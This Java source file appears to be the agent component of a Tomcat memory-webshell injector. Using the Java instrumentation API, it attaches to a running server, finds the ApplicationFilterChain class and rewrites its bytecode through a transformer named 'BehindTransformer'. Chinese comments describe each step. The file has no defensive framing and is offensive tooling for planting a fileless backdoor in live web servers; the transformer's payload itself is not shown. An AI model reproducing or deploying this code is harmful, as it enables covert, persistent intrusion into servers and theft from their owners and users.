package com.zpchcbd.mem;

import javassist.*;

import java.io.IOException;
import java.lang.instrument.ClassDefinition;
import java.lang.instrument.Instrumentation;
import java.lang.instrument.UnmodifiableClassException;

public class Agent {
    public static final String CLASS_NAME = "org.apache.catalina.core.ApplicationFilterChain";
    public static void agentmain(String args, Instrumentation inst) throws Exception {
        inst.addTransformer(new BehindTransformer(), true);
        // 在被注入的进程中进行遍历已经加载的类，如果是org.apache.catalina.core.ApplicationFilterChain
        Class[] loadedClasses = inst.getAllLoadedClasses();
        for (int i = 0; i < loadedClasses.length; ++i) {
            Class clazz = loadedClasses[i];
            if (clazz.getName().equals(CLASS_NAME)) {
                try {
                    // 那么通过retransformClasses方法将该org.apache.catalina.core.ApplicationFilterChain类的字节码更新
                    inst.retransformClasses(new Class[]{clazz});
                } catch (Exception var9) {
                    var9.printStackTrace();
                }
            }
        }
    }
}
